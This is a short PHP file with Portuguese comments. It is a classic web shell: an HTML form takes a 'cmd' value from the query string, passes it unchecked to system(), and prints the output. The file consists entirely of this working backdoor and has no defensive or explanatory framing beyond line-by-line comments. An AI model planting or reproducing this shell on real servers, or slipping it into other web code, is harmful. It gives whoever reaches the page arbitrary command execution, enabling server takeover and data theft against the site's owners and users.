<html>
<body>
<!-- Um formulário HTML básico -->
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <!-- Um campo de entrada de texto para o comando a ser executado -->
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <!-- Um botão de envio do formulário -->
    <input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    // Verifica se há um comando enviado via método GET
    if(isset($_GET['cmd']))
    {
        // Executa o comando do sistema e exibe a saída
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
